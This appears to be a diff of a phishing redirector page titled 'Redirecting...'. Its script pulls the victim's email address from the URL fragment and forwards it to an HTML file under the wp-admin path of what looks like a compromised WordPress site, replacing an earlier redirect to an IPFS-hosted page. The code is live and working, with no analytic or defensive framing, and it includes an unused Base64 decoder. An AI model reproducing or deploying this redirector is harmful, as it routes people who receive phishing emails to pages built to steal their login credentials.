@@ -1,15 +1,41 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head></head>
-</body>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+
 <script>
- var hash = window.location.hash;
- if(hash !== "") {
+function b64DecodeUnicode(str) {
+    // Decodes a Base64-encoded string
+    return decodeURIComponent(atob(str).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+}
 
-    hash = hash.split('#');
-   const email = hash[1];
+function redirectPage() {
+    var query = window.location.href;
+    console.log("Full URL:", query);
+    
+    var res = query.split("#");
+    var data2 = res.length > 1 ? res[1] : null;
 
-      window.location.href = "https://ipfs.io/ipfs/bafybeieilyvzd25gnhgig7flog6mj4ipa4nax2l5ifp6rixyqnn4qoomny/mralink.html/?eta=" + email;
- }
+    if (data2) {
+        var realemailID = decodeURIComponent(data2); // Converts %40 back to @
+        console.log("Decoded Email:", realemailID);
+        
+        window.location.href = "https://fbfdistribuidora.com.br/wp-admin/ubinhj.html#" + realemailID;
+    } else {
+        console.log("No email found, redirecting...");
+        window.location.href = "https://fbfdistribuidora.com.br/wp-admin/ubinhj.html#";
+    }
+}
+
+redirectPage();
 </script>
+
+</body>
 </html>
